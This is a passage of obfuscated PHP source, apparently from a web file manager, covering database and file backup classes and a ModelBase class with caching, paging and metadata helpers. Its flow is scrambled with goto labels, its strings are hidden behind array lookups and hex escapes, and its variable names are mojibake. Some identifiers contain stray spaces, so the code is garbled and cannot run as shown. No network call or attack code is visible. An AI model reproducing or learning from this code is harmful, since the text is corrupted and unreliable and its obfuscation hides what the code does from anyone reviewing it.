$AÌ‚äÓ“ù¹[$a½ª¯ÀÙ[0]][$a½ª¯ÀÙ[1]][$a½ª¯ÀÙ[2]] = $B®æ™¸‚â¾; break; } } Model($DŠäÂØ[704])->update($AÌ‚äÓ“ù¹[$DŠäÂØ[388]], $AÌ‚äÓ“ù¹); self::$option = $AÌ‚äÓ“ù¹; return self::$option; } public function keep() { $f‹‰µâäç› =& $_SERVER[¹…ÕÄ]; $C‘¦šµ˜„Å = self::get(); if ($C‘¦šµ˜„Å[$f‹‰µâäç›[289]][$f‹‰µâäç›[709]][$f‹‰µâäç›[705]] == $f‹‰µâäç›[86]) { return; } $this->backupKeep($C‘¦šµ˜„Å); self::set(array($f‹‰µâäç›[720] => 1)); } private function backupKeep($eœŞÚÂª¢) { goto d¼¢’ÜÈª‰; F——ÇĞ¾†: for ($fßøÎ–à·¤ = 0; $fßøÎ–à·¤ < 12; $fßøÎ–à·¤++) { $F¶ÛÛÚÂ[] = date($eô­¬òÒ÷[721], strtotime("\x2d{$fßøÎ–à·¤}\x20\x6d\157\156\x74\150\163")); } $F¶ÛÛÚÂ = array_unique($F¶ÛÛÚÂ); foreach ($a—®°†ò×‹ as $Eƒ×ÁÊ¯ó–) { if (!empty($Eƒ×ÁÊ¯ó–[$eô­¬òÒ÷[28]]) && in_array($Eƒ×ÁÊ¯ó–[$eô­¬òÒ÷[28]], $F¶ÛÛÚÂ)) { continue; } Model($eô­¬òÒ÷[704])->remove($Eƒ×ÁÊ¯ó–[$eô­¬òÒ÷[388]]); $E»ôÉ¸š—¼ = "\173\x69\157\72{$eœŞÚÂª¢[$eô­¬òÒ÷[707]]}\175\x2f\144\x61\164\x61\142\141\x73\x65\57\142\x61\143\x6b\165\x70\x5f{$Eƒ×ÁÊ¯ó–[$eô­¬òÒ÷[28]]}"; IO::remove($E»ôÉ¸š—¼, !1); } goto b‡ƒ¶ê„Ğ; E‡Ã¢·¡™Ğ: $fßøÎ–à·¤ = 0; $F¶ÛÛÚÂ = array(); foreach ($a—®°†ò×‹ as $Eƒ×ÁÊ¯ó–) { if ($fßøÎ–à·¤ >= 7) { break; } $F¶ÛÛÚÂ[] = $Eƒ×ÁÊ¯ó–[$eô­¬òÒ÷[28]]; $fßøÎ–à·¤++; } goto F——ÇĞ¾†; d¼¢’ÜÈª‰: $eô­¬òÒ÷ =& $_SERVER[¹…ÕÄ]; $a—®°†ò×‹ = Model($eô­¬òÒ÷[704])->listData(); if (empty($a—®°†ò×‹)) { return; } goto E‡Ã¢·¡™Ğ; b‡ƒ¶ê„Ğ: } public function db() { goto d ¹µ˜ğ‡ä; d ¹µ˜ğ‡ä: $D¥Œã”àĞ =& $_SERVER[¹…ÕÄ]; $fí·Æç = self::get(); if ($fí·Æç[$D¥Œã”àĞ[289]][$D¥Œã”àĞ[710]][$D¥Œã”àĞ[705]] == $D¥Œã”àĞ[86]) { return !0; } goto EÃù¯µ™¾Â; a§Ã Æ¡Ñ: return !0; goto b‹Ö†¹µÛ³; EÃù¯µ™¾Â: $CÚÙ‡°ç¦Ä = new BackupDb(); if (!$CÚÙ‡°ç¦Ä->index()) { return !1; } self::set(array($D¥Œã”àĞ[722] => 1)); goto a§Ã Æ¡Ñ; b‹Ö†¹µÛ³: } public function dbFile() { goto EöİîåáÂÏ; EöİîåáÂÏ: $aÍ„…æÆ¬â =& $_SERVER[¹…ÕÄ]; $EÔ½îÆŒ¸ğ = self::get(); if ($EÔ½îÆŒ¸ğ[$aÍ„…æÆ¬â[289]][$aÍ„…æÆ¬â[713]][$aÍ„…æÆ¬â[705]] == $aÍ„…æÆ¬â[86]) { return !0; } goto fÔÌÖ¨áÉÒ; Aòä ±¸æã: return !0; goto eÂ¸³‰İ‹; fÔÌÖ¨áÉÒ: $DƒËø…‡ğİ = new BackupDbFile(); if (!$DƒËø…‡ğİ->index()) { return !1; } self::set(array($aÍ„…æÆ¬â[723] => 1)); goto Aòä ±¸æã; eÂ¸³‰İ‹: } public function file() { $eëÄôßÔ‹ =& $_SERVER[¹…ÕÄ]; $c®×“¸¨Î˜ = self::get(); if ($c®×“¸¨Î˜[$eëÄôßÔ‹[289]][$eëÄôßÔ‹[173]][$eëÄôßÔ‹[705]] == $eëÄôßÔ‹[86]) { return !0; } if (!isset($c®×“¸¨Î˜[$eëÄôßÔ‹[708]]) || $c®×“¸¨Î˜[$eëÄôßÔ‹[708]] == $eëÄôßÔ‹[491]) { $c‡ê²æùˆ = new BackupFile(); if (!$c‡ê²æùˆ->index()) { return !1; } } self::set(array($eëÄôßÔ‹[724] => 1, $eëÄôßÔ‹[705] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto C‰à¢…àœ÷; aáõ¯Ä§«¯: foreach ($AåÀó‰ÔÙ as $bÛ´®°¦˜) { $F¼Ìß£¨­Æ = $DŒä´ó . $bÛ´®°¦˜ . $d¼­‘ÉÅºì[733]; $DêÈÂ”ùœ· = null; if ($bÛ´®°¦˜ == $d¼­‘ÉÅºì[734] && (!isset($cğ‰÷™’æµ[$d¼­‘ÉÅºì[708]]) || $cğ‰÷™’æµ[$d¼­‘ÉÅºì[708]] == $d¼­‘ÉÅºì[491])) { $DêÈÂ”ùœ· = self::$io; } $CÙìÑô„¢ƒ += $BÅ¹ò¥˜’İ->sqlFromDb($bÛ´®°¦˜, $F¼Ìß£¨­Æ, $b¯ËÔùÂ˜, $DêÈÂ”ùœ·); } if (isset($b¯ËÔùÂ˜->task[$d¼­‘ÉÅºì[735]])) { $AáªÍ„¦Ø¬ = $b¯ËÔùÂ˜->task[$d¼­‘ÉÅºì[735]] ? $b¯ËÔùÂ˜->task[$d¼­‘ÉÅºì[735]] : timeFloat(); $A¶Î•ÕùË = $AáªÍ„¦Ø¬ - $b¯ËÔùÂ˜->task[$d¼­‘ÉÅºì[736]]; if ($A¶Î•ÕùË >= 0.2) { $bÒôÁ©»ª§ += 1; } } $b¯ËÔùÂ˜->end(); goto b¼¿›Úíˆ; D÷à¹ĞÌ÷ö: self::$name = $cğ‰÷™’æµ[$d¼­‘ÉÅºì[28]]; $CÕ©‰÷Ş½” = $GLOBALS[$d¼­‘ÉÅºì[6]][$d¼­‘ÉÅºì[17]]; $Dëæ·àñìô = $this->_dbType($CÕ©‰÷Ş½”); goto A‚ó”Ñ½ƒÓ; b¼¿›Úíˆ: $AªëÜîÑÚ = array($d¼­‘ÉÅºì[737] => $Dëæ·àñìô, $d¼­‘ÉÅºì[722] => 1, $d¼­‘ÉÅºì[738] => $bÒôÁ©»ª§, $d¼­‘ÉÅºì[739] => $CÙìÑô„¢ƒ); Backup::set($AªëÜîÑÚ); if ($bÒôÁ©»ª§ > $CÙìÑô„¢ƒ) { return !1; } goto c…Õ÷¦äÛË; C‰à¢…àœ÷: $d¼­‘ÉÅºì =& $_SERVER[¹…ÕÄ]; $cğ‰÷™’æµ = Backup::get(); self::$io = $cğ‰÷™’æµ[$d¼­‘ÉÅºì[707]]; goto D÷à¹ĞÌ÷ö; A‚ó”Ñ½ƒÓ: $BÅ¹ò¥˜’İ = new DbManage($CÕ©‰÷Ş½”, $Dëæ·àñìô); $DŒä´ó = TEMP_FILES . $d¼­‘ÉÅºì[725] . self::$name . $d¼­‘ÉÅºì[8]; del_dir($DŒä´ó); goto Bš«µ˜ÄŒ¤; Bš«µ˜ÄŒ¤: mk_dir($DŒä´ó); $bÒôÁ©»ª§ = $CÙìÑô„¢ƒ = 0; try { $AåÀó‰ÔÙ = $BÅ¹ò¥˜’İ->db()->getTables(); } catch (Exception $dˆ›’¤ª„) { return !1; } goto CÒÇ†ƒ÷§°; c…Õ÷¦äÛË: return !0; goto DÈË«œÛ·´; CÒÇ†ƒ÷§°: $AåÀó‰ÔÙ = array_diff($AåÀó‰ÔÙ, array($d¼­‘ÉÅºì[726], $d¼­‘ÉÅºì[727])); foreach ($AåÀó‰ÔÙ as $bÛ´®°¦˜) { $bÒôÁ©»ª§ += $BÅ¹ò¥˜’İ->model($bÛ´®°¦˜)->count(); } $b¯ËÔùÂ˜ = new Task($d¼­‘ÉÅºì[728], $d¼­‘ÉÅºì[729], $bÒôÁ©»ª§, LNG($d¼­‘ÉÅºì[730]) . $d¼­‘ÉÅºì[731] . LNG($d¼­‘ÉÅºì[732])); goto aáõ¯Ä§«¯; DÈË«œÛ·´: } private function _dbType($DŒ³Ğğ£Ó) { goto A¢œÄ†à‚è; BÊ°†ìÚç‡: if ($b¢èˆÇ¯’ == $e›ç¯¤®ã[741]) { $A”×Œæ˜’® = explode($e›ç¯¤®ã[4], $DŒ³Ğğ£Ó[$e›ç¯¤®ã[742]]); $b¢èˆÇ¯’ = $A”×Œæ˜’®[0]; } $dîËßíõäÕ = array($e›ç¯¤®ã[743] => $e›ç¯¤®ã[9], $e›ç¯¤®ã[744] => $e›ç¯¤®ã[745]); if (isset($dîËßíõäÕ[$b¢èˆÇ¯’])) { $b¢èˆÇ¯’ = $dîËßíõäÕ[$b¢èˆÇ¯’]; } goto cøŠé°„Œà; A¢œÄ†à‚è: $e›ç¯¤®ã =& $_SERVER[¹…ÕÄ]; $DŒ³Ğğ£Ó = array_change_key_case($DŒ³Ğğ£Ó); $b¢èˆÇ¯’ = $DŒ³Ğğ£Ó[$e›ç¯¤®ã[740]]; goto BÊ°†ìÚç‡; cøŠé°„Œà: return $b¢èˆÇ¯’; goto aŞóÀ´¸™; aŞóÀ´¸™: } } class BackupDbFile { public function __construct() { } public function index() { goto eÉÓ×©Êåİ; AñÁÌŞà„: $a‹¬‚–âÇ->task[$a¢ˆ·ğ’ä’[714]] = $Aá‰„ªµÇ; foreach ($C”ï›‹Å´[$a¢ˆ·ğ’ä’[73]] as $a¿ŒË‚ÆÚğ) { $cÔ¯ˆ¼•â = IO::move($a¿ŒË‚ÆÚğ[$a¢ˆ·ğ’ä’[75]], $Bøò²¿ïõ); if (!$cÔ¯ˆ¼•â) { $a‹¬‚–âÇ->end(); $f°áø™£Ôš = IO::getLastError($a¢ˆ·ğ’ä’[749] . $a¿ŒË‚ÆÚğ[$a¢ˆ·ğ’ä’[75]] . $a¢ˆ·ğ’ä’[750] . $Bøò²¿ïõ . $a¢ˆ·ğ’ä’[499]); write_log($f°áø™£Ôš, $a¢ˆ·ğ’ä’[729]); return !1; } } $E÷Ã½ÍÜˆ¤ = CONTROLLER_DIR . $a¢ˆ·ğ’ä’[751]; goto Eï¨†âéÛ¾; eÉÓ×©Êåİ: $a¢ˆ·ğ’ä’ =& $_SERVER[¹…ÕÄ]; $f‚‰Ù²ˆå = Backup::get(); $dÓÔ¯ ÌŞ‡ = $f‚‰Ù²ˆå[$a¢ˆ·ğ’ä’[28]]; goto d¹Ò‰ˆ‡¦š; Dç«ºÕÒ‰»: $C”ï›‹Å´ = IO::listPath($aç¿Û¥÷¶‚); $aÀ‚»• = isset($C”ï›‹Å´[$a¢ˆ·ğ’ä’[73]]) ? $C”ï›‹Å´[$a¢ˆ·ğ’ä’[73]] : array(); $Aá‰„ªµÇ = array_sum(array_column($aÀ‚»•, $a¢ˆ·ğ’ä’[77])); goto B¼ìÊÃØŞ¶; DŸÛÂ³¸ö: $a‹¬‚–âÇ->end(); Backup::set(array($a¢ˆ·ğ’ä’[753] => $Aá‰„ªµÇ)); return !0; goto dæ‹Ô¦˜‹„; Eï¨†âéÛ¾: $E…ĞºŸïŠì = CONTROLLER_DIR . $a¢ˆ·ğ’ä’[752]; IO::copy($E÷Ã½ÍÜˆ¤, $Bøò²¿ïõ); IO::copy($E…ĞºŸïŠì, $Bøò²¿ïõ); goto DŸÛÂ³¸ö; B¼ìÊÃØŞ¶: if (!$Aá‰„ªµÇ) { return !1; } Backup::set(array($a¢ˆ·ğ’ä’[746] => $Aá‰„ªµÇ)); $a‹¬‚–âÇ = new TaskFileTransfer($a¢ˆ·ğ’ä’[747], $a¢ˆ·ğ’ä’[729], count($aÀ‚»•), LNG($a¢ˆ·ğ’ä’[730]) . $a¢ˆ·ğ’ä’[434] . LNG($a¢ˆ·ğ’ä’[732]) . $a¢ˆ·ğ’ä’[748]); goto AñÁÌŞà„; d¹Ò‰ˆ‡¦š: $aç¿Û¥÷¶‚ = TEMP_FILES . "\x62\141\x63\153\165\x70\137{$dÓÔ¯ ÌŞ‡}\57"; $Bøò²¿ïõ = "\173\151\157\72{$f‚‰Ù²ˆå[$a¢ˆ·ğ’ä’[707]]}\x7d\57\144\141\164\x61\142\x61\x73\x65\x2f\x62\x61\x63\x6b\x75\160\137{$dÓÔ¯ ÌŞ‡}\x2f"; if (!($Bøò²¿ïõ = IO::mkdir($Bøò²¿ïõ))) { return !1; } goto Dç«ºÕÒ‰»; dæ‹Ô¦˜‹„: } } goto e˜¢Âè»Ğè; E»óƒê—ÓÜ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\x69\146\171\124\151\155\x65", "\164\x69\155\x65", "\151\156\163\x65\162\164\54\x75\160\144\x61\x74\145", "\x66\x75\156\x63\164\x69\x6f\x6e"), array("\x63\162\145\x61\164\145\x54\151\155\x65", "\164\151\155\x65", "\x69\156\163\145\x72\x74", "\146\x75\156\x63\164\x69\157\156")); public function setDataAuto($a’¬ÈÍÏæ) { $this->dataAuto = $a’¬ÈÍÏæ; } public function __construct($F±ì¸Ø°Ü¦ = '', $Fˆ«†ø‹‚Ñ = '', $Dğ÷É››Æ = '') { parent::__construct($F±ì¸Ø°Ü¦, $Fˆ«†ø‹‚Ñ, $Dğ÷É››Æ); } public static function textEncode($e­Ã¯´ğƒ”) { if (!$e­Ã¯´ğƒ”) { return $e­Ã¯´ğƒ”; } $bòˆöÄÂáì = json_encode($e­Ã¯´ğƒ”); $bòˆöÄÂáì = preg_replace_callback($_SERVER[¹…ÕÄ][351], function ($f£µÃˆŠ) { return addslashes($f£µÃˆŠ[0]); }, $bòˆöÄÂáì); return json_decode($bòˆöÄÂáì); } public static function textDecode($Cœ•Æª¼Š²) { $Dèò‹µ‘Û =& $_SERVER[¹…ÕÄ]; $cÙ½ĞàŸĞš = json_encode($Cœ•Æª¼Š²); $cÙ½ĞàŸĞš = preg_replace_callback($Dèò‹µ‘Û[352], function ($b•Ô´öª’ï) { return $_SERVER[¹…ÕÄ][96]; }, $cÙ½ĞàŸĞš); return json_decode($cÙ½ĞàŸĞš); } protected $tableMeta = array(); protected function _beforeInsert(&$B–æ§Õ©”Ü, $EŒö‚§ÜÔ) { $DíµÔ­˜î¶ =& $_SERVER[¹…ÕÄ]; if (!$this->checkDataAutoHas($DíµÔ­˜î¶[353])) { return; } $this->dataBeforeFilter($B–æ§Õ©”Ü, $DíµÔ­˜î¶[353]); } protected function _beforeUpdate(&$DÒëĞ»·Û£, $bŞĞ‡¡á—Ü) { $C¶ù‰ƒ¦Ä¨ =& $_SERVER[¹…ÕÄ]; if (!$this->checkDataAutoHas($C¶ù‰ƒ¦Ä¨[354])) { return; } $this->dataBeforeFilter($DÒëĞ»·Û£, $C¶ù‰ƒ¦Ä¨[354]); } protected function _afterSelect(&$DŞ·­ì, $dğà‘á…ôù) { if (!is_array($DŞ·­ì)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹…ÕÄ][355])) { return; } foreach ($DŞ·­ì as &$aöìò´Ç) { $this->dataAfterFilter($aöìò´Ç); } unset($aöìò´Ç); } protected function _afterFind(&$BÎ÷Ø„ÌÑ, $AÓëáäøñÓ) { if (!is_array($BÎ÷Ø„ÌÑ)) { return; } if (!$this->checkDataAutoHas($_SERVER[¹…ÕÄ][355])) { return; } $this->dataAfterFilter($BÎ÷Ø„ÌÑ); } public function setAutoIncrement($C…Û‹ÜÙ¼·) { $bÃ¦ÊŠÜ¥ñ = array($this->getPk() => $C…Û‹ÜÙ¼·); $FİáÒÔù¢« = $this->data($bÃ¦ÊŠÜ¥ñ)->add(); if ($FİáÒÔù¢«) { $this->delete($FİáÒÔù¢«); } } public function getAutoIncrement() { $cÈ ´È×Ö´ = $this->getTableName(); $A‹‰Áæ‡ÆË = $this->max($this->getPk()); $cğÍ«©ŒâÃ = $this->query("\163\x68\157\x77\x20\164\x61\x62\x6c\145\40\x73\164\x61\x74\165\x73\x20\x77\150\x65\162\x65\40\116\141\x6d\145\75\x27{$cÈ ´È×Ö´}\x27"); $fœØ“áË²¿ = $cğÍ«©ŒâÃ[0][$_SERVER[¹…ÕÄ][356]]; $Bƒ‘ô•±Ù = max($A‹‰Áæ‡ÆË, $fœØ“áË²¿); return $Bƒ‘ô•±Ù; } protected function _callBefore($F©Ù¯ßİ³, $Cô½ä×î–ó) { return $this->cacheCallCheck($F©Ù¯ßİ³, $Cô½ä×î–ó, !1); } protected function _callAfter($Eí…ÉŠ¡Ó´, $cò¾Î…†²Ü) { return $this->cacheCallCheck($Eí…ÉŠ¡Ó´, $cò¾Î…†²Ü, !0); } protected function cacheFunctionAlias($EÓÚéÌ¼˜Ô) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($d„–‹ºÌ·, $d£®àä­÷, $a¹•°ïùçâ = false) { $Bƒ™¨ËñÀ‘ = $this->cacheFunctionAlias($d£®àä­÷); if (!$Bƒ™¨ËñÀ‘) { return; } foreach ($Bƒ™¨ËñÀ‘ as $Fª×Õ›‰ => $Bà´ê†‹¨) { $FºœÒèà™ = $Bà´ê†‹¨[0]; $fğÙ˜ÆÕ‹ = explode($_SERVER[¹…ÕÄ][47], $Bà´ê†‹¨[1]); if ($d„–‹ºÌ· == $Fª×Õ›‰) { return $this->cacheFunctionGet($Fª×Õ›‰, $FºœÒèà™); } if ($a¹•°ïùçâ && in_array($d„–‹ºÌ·, $fğÙ˜ÆÕ‹)) { $this->cacheFunctionClear($Fª×Õ›‰, $FºœÒèà™); } } } public function cacheFunctionGet($dÖ‚ãÂˆ¥¯, $B˜¼¢Á‚ŠÍ) { $F‘‰×ÀÚ = $this->cacheKeyMake($dÖ‚ãÂˆ¥¯, $B˜¼¢Á‚ŠÍ); $c¢ØÀÖ¶Šù = Cache::get($F‘‰×ÀÚ); if (!is_array($c¢ØÀÖ¶Šù)) { $c¢ØÀÖ¶Šù = call_user_func_array(array($this, $dÖ‚ãÂˆ¥¯), array($B˜¼¢Á‚ŠÍ, !0)); Cache::set($F‘‰×ÀÚ, $c¢ØÀÖ¶Šù); } return $c¢ØÀÖ¶Šù; } public function cacheFunctionClear($cƒŸï³ÍÄ, $a¤‰ïãÈ«›) { $a—æéœ°› = $a¤‰ïãÈ«›; if (!is_array($a¤‰ïãÈ«›)) { $a—æéœ°› = array($a¤‰ïãÈ«›); } foreach ($a—æéœ°› as $A¥—©ƒµ´ï) { $e¡¡»º¢Ì = $this->cacheKeyMake($cƒŸï³ÍÄ, $A¥—©ƒµ´ï); Cache::remove($e¡¡»º¢Ì); } } private function cacheKeyMake($EóÓâ­ÕÁ±, $F‹…œÑÈÏ£) { $C§„‚Ñ£îŞ =& $_SERVER[¹…ÕÄ]; return get_class($this) . $C§„‚Ñ£îŞ[70] . $EóÓâ­ÕÁ± . $C§„‚Ñ£îŞ[357] . $F‹…œÑÈÏ£; } protected function selectPageReset() { $Cß¤é£ïæè =& $_SERVER[¹…ÕÄ]; if (isset($GLOBALS[$Cß¤é£ïæè[358]])) { return; } $GLOBALS[$Cß¤é£ïæè[358]] = isset($GLOBALS[$Cß¤é£ïæè[7]][$Cß¤é£ïæè[359]]) ? $GLOBALS[$Cß¤é£ïæè[7]][$Cß¤é£ïæè[359]] : !1; $GLOBALS[$Cß¤é£ïæè[360]] = isset($GLOBALS[$Cß¤é£ïæè[7]][$Cß¤é£ïæè[349]]) ? $GLOBALS[$Cß¤é£ïæè[7]][$Cß¤é£ïæè[349]] : !1; $GLOBALS[$Cß¤é£ïæè[7]][$Cß¤é£ïæè[359]] = !1; $GLOBALS[$Cß¤é£ïæè[7]][$Cß¤é£ïæè[349]] = !1; } protected function selectPageRestore() { $d”¹…®¡¾œ =& $_SERVER[¹…ÕÄ]; if (!isset($GLOBALS[$d”¹…®¡¾œ[358]])) { return; } $GLOBALS[$d”¹…®¡¾œ[7]][$d”¹…®¡¾œ[359]] = $GLOBALS[$d”¹…®¡¾œ[358]]; $GLOBALS[$d”¹…®¡¾œ[7]][$d”¹…®¡¾œ[349]] = $GLOBALS[$d”¹…®¡¾œ[360]]; unset($GLOBALS[$d”¹…®¡¾œ[358]]); unset($GLOBALS[$d”¹…®¡¾œ[360]]); } protected function selectPage($c”ªê°ˆ”‹ = 200, $d•íÑ‘é¬Ò = 1) { goto EÙÑğŸ; c´ÖÂ­¯ÖË: $Fš‡¹ö‘• = 50000; $c”ªê°ˆ”‹ = isset($in[$e±Ÿ–Ò½ÖÂ[359]]) && $in[$e±Ÿ–Ò½ÖÂ[359]] ? $in[$e±Ÿ–Ò½ÖÂ[359]] : $c”ªê°ˆ”‹; if ($c”ªê°ˆ”‹ === -1) { $in[$e±Ÿ–Ò½ÖÂ[359]] = !1; $Fš‡¹ö‘• = 100000000; $c”ªê°ˆ”‹ = $Fš‡¹ö‘•; } goto d¿ƒ›®¥ÔÑ; cÆ„²±ÅÅÏ: return $FĞĞ—ãê¼; goto cƒƒ•—Úæö; A”…õõË„: $aÏŒ†“÷› = array(); $E¨Ÿ‡Â³×Í = 1; if ($d•íÑ‘é¬Ò == 1 && $E¨Ÿ‡Â³×Í) { $this->optionsValue($Cè÷„‰¬ğÅ); $aÏŒ†“÷› = $this->page($d•íÑ‘é¬Ò, $c”ªê°ˆ”‹)->select(); $c‰†¬Ñëäİ = is_array($aÏŒ†“÷›) ? count($aÏŒ†“÷›) : 0; if ($c‰†¬Ñëäİ <= $c”ªê°ˆ”‹) { $aº™Œ¦Íª = 1; } else { $this->optionsValue($D¢¼Õ¾ß¸); $c‰†¬Ñëäİ = intval($this->count()); $aº™Œ¦Íª = ceil($c‰†¬Ñëäİ / $c”ªê°ˆ”‹); } } else { $this->optionsValue($D¢¼Õ¾ß¸); $c‰†¬Ñëäİ = intval($this->count()); $aº™Œ¦Íª = ceil($c‰†¬Ñëäİ / $c”ªê°ˆ”‹); $d•íÑ‘é¬Ò = $d•íÑ‘é¬Ò >= $aº™Œ¦Íª ? $aº™Œ¦Íª : $d•íÑ‘é¬Ò; $this->optionsValue($Cè÷„‰¬ğÅ); $aÏŒ†“÷› = $this->page($d•íÑ‘é¬Ò, $c”ªê°ˆ”‹)->select(); } goto A×˜øá­ ¤; A×˜øá­ ¤: if (!is_array($aÏŒ†“÷›)) { $aÏŒ†“÷› = array(); } if ($aº™Œ¦Íª == 1) { $c‰†¬Ñëäİ = count($aÏŒ†“÷›); } $FĞĞ—ãê¼ = array($e±Ÿ–Ò½ÖÂ[362] => array($e±Ÿ–Ò½ÖÂ[363] => $c‰†¬Ñëäİ, $e±Ÿ–Ò½ÖÂ[359] => $c”ªê°ˆ”‹, $e±Ÿ–Ò½ÖÂ[349] => $d•íÑ‘é¬Ò, $e±Ÿ–Ò½ÖÂ[364] => $aº™Œ¦Íª), $e±Ÿ–Ò½ÖÂ[365] => $aÏŒ†“÷›); goto cÆ„²±ÅÅÏ; d¿ƒ›®¥ÔÑ: $D¢¼Õ¾ß¸ = $Cè÷„‰¬ğÅ; $D¢¼Õ¾ß¸[$e±Ÿ–Ò½ÖÂ[361]] = array(); $c”ªê°ˆ”‹ = intval($c”ªê°ˆ”‹); goto cîÎ‡ãà; cîÎ‡ãà: $c”ªê°ˆ”‹ = $c”ªê°ˆ”‹ <= 5 ? 5 : ($c”ªê°ˆ”‹ >= $Fš‡¹ö‘• ? $Fš‡¹ö‘• : $c”ªê°ˆ”‹); $d•íÑ‘é¬Ò = intval(isset($in[$e±Ÿ–Ò½ÖÂ[349]]) && $in[$e±Ÿ–Ò½ÖÂ[349]] ? $in[$e±Ÿ–Ò½ÖÂ[349]] : $d•íÑ‘é¬Ò); $d•íÑ‘é¬Ò = $d•íÑ‘é¬Ò <= 1 ? 1 : $d•íÑ‘é¬Ò; goto A”…õõË„; EÙÑğŸ: $e±Ÿ–Ò½ÖÂ =& $_SERVER[¹…ÕÄ]; global $in; $Cè÷„‰¬ğÅ = $this->optionsValue(); goto c´ÖÂ­¯ÖË; cƒƒ•—Úæö: } protected function checkLength($C«Ëïİ’îç, $dÅ ¢å½ÖÃ = 0, $dÛ¤é‡ã = '') { $b’•¹ÒÑ‰Ó =& $_SERVER[¹…ÕÄ]; $dÅ ¢å½ÖÃ = $dÅ ¢å½ÖÃ ? $dÅ ¢å½ÖÃ : 65536; if (!$C«Ëïİ’îç || strlen($C«Ëïİ’îç) < $dÅ ¢å½ÖÃ) { return; } $dÛ¤é‡ã = $dÛ¤é‡ã ? $dÛ¤é‡ã . $b’•¹ÒÑ‰Ó[67] : $b’•¹ÒÑ‰Ó[33]; show_json($dÛ¤é‡ã . LNG($b’•¹ÒÑ‰Ó[366]) . "\50{$dÅ ¢å½ÖÃ}\51", !1); } protected function metaSet($dÈàæ©…Ó¹, $B•ÓöÔ„ÀÔ = null, $C¶Íİ·ŒÅÚ = null) { goto Dø‹…ƒ¨Ğî; fòª¢ÀÁŞ: $B»‡ò˜‰Ü = $this->tableMeta[$AÀäì¾ñÁÛ[368]]; $e¸ëºõëïÆ = Model($B»‡ò˜‰Ü); $BÍÖ©ƒÊÑ— = array($eöÃÖ³’œâ => $dÈàæ©…Ó¹, $AÀäì¾ñÁÛ[369] => $B•ÓöÔ„ÀÔ); goto c¦›ŸÚéÅ; FÊ†æ÷†ï¼: CacheLock::unlock($b±ÜÓ²Îœ); return !0; goto fÛŠÄ‚ßº·; dæØÀ‚¥İ²: $b±ÜÓ²Îœ = $AÀäì¾ñÁÛ[371] . $this->tableMeta; CacheLock::lock($b±ÜÓ²Îœ); $e¸ëºõëïÆ->where(array($eöÃÖ³’œâ => $dÈàæ©…Ó¹))->addAll($F£‘ß˜÷àÔ, array(), !0); goto FÊ†æ÷†ï¼; E­ßÊ–èÜ: if (is_string($B•ÓöÔ„ÀÔ)) { $C® Š£æˆõ[$B•ÓöÔ„ÀÔ] = $C¶Íİ·ŒÅÚ; } $F£‘ß˜÷àÔ = array(); foreach ($C® Š£æˆõ as $a‚÷®é÷Û” => $BƒùËç×„) { $this->checkLength($BƒùËç×„, !1, $B»‡ò˜‰Ü . $AÀäì¾ñÁÛ[4] . $a‚÷®é÷Û”); $F£‘ß˜÷àÔ[] = array($eöÃÖ³’œâ => $dÈàæ©…Ó¹, $AÀäì¾ñÁÛ[92] => $a‚÷®é÷Û”, $AÀäì¾ñÁÛ[370] => $BƒùËç×„); } goto dæØÀ‚¥İ²; Dø‹…ƒ¨Ğî: $AÀäì¾ñÁÛ =& $_SERVER[¹…ÕÄ]; if (!$this->tableMeta || !$dÈàæ©…Ó¹) { return !1; } $eöÃÖ³’œâ = $this->tableMeta[$AÀäì¾ñÁÛ[367]]; goto fòª¢ÀÁŞ; c¦›ŸÚéÅ: if (is_null($B•ÓöÔ„ÀÔ)) { return $e¸ëºõëïÆ->where(array($eöÃÖ³’œâ => $dÈàæ©…Ó¹))->delete(); } if (is_null($C¶Íİ·ŒÅÚ) && is_string($B•ÓöÔ„ÀÔ)) { return $e¸ëºõëïÆ->where($BÍÖ©ƒÊÑ—)->delete(); } $C® Š£æˆõ = is_array($B•ÓöÔ„ÀÔ) ? $B•ÓöÔ„ÀÔ : array(); goto E­ßÊ–èÜ; fÛŠÄ‚ßº·: } public function metaGet($eŒ˜Œïø, $a×åîîó¬ = false) { goto Eˆ…¿ê¦; b·ßĞÛ¢‡×: $cß½‹ÁÒá = Model($this->tableMeta[$aå×¨ØÑ[368]]); if ($a×åîîó¬) { $a·¡÷ÈËˆÏ = array($e·œÍ‡âÔö => $eŒ˜Œïø, $aå×¨ØÑ[92] => $a×åîîó¬); return $cß½‹ÁÒá->where($a·¡÷ÈËˆÏ)->getField($aå×¨ØÑ[370]); } $a·¡÷ÈËˆÏ = array($e·œÍ‡âÔö => $eŒ˜Œïø); goto B‰ßÎÕØ—¬; B‰ßÎÕØ—¬: $Fäà¬¡·Ç­ = $cß½‹ÁÒá->field($aå×¨ØÑ[372])->where($a·¡÷ÈËˆÏ)->select(); $Fäà¬¡·Ç­ = array_to_keyvalue($Fäà¬¡·Ç­, $aå×¨ØÑ[92], $aå×¨ØÑ[370]); return $Fäà¬¡·Ç­; goto aôâ®•êÜ; Eˆ…¿ê¦: $aå×¨ØÑ =& $_SERVER[¹…ÕÄ]; if (!$this->tableMeta) { return array(); } $e·œÍ‡âÔö = $this->tableMeta[$aå×¨ØÑ[367]]; goto b·ßĞÛ¢‡×; aôâ®•êÜ: } private function checkDataAutoHas($F†¯’ì„õ·) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $aº†‘¤ó°ã) { if (in_array($F†¯’ì„õ·, explode($_SERVER[¹…ÕÄ][47], $aº†‘¤ó°ã[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$a¶´´ ŠíÄ, $bß‘ò›ç…) { $f…¿‰õŠÜÃ =& $_SERVER[¹…ÕÄ]; foreach ($this->dataAuto as $FŞµºÓ¨†) { $BŸó¸†¢ÊÃ = $FŞµºÓ¨†[0]; if (!in_array($bß‘ò›ç…, explode($f…¿‰õŠÜÃ[47], $FŞµºÓ¨†[2]))) { continue; } switch (trim($FŞµºÓ¨†[3])) { case $f…¿‰õŠÜÃ[317]: case $f…¿‰õŠÜÃ[318]: $báÇ‹³Ü– = $FŞµºÓ¨†[1]; $dåßöµ¡Ã‘ = isset($FŞµºÓ¨†[4]) ? (array) $FŞµºÓ¨†[4] : array(); if ($báÇ‹³Ü– == $f…¿‰õŠÜÃ[195] && array_key_exists($BŸó¸†¢ÊÃ, $a¶´´ ŠíÄ)) { if 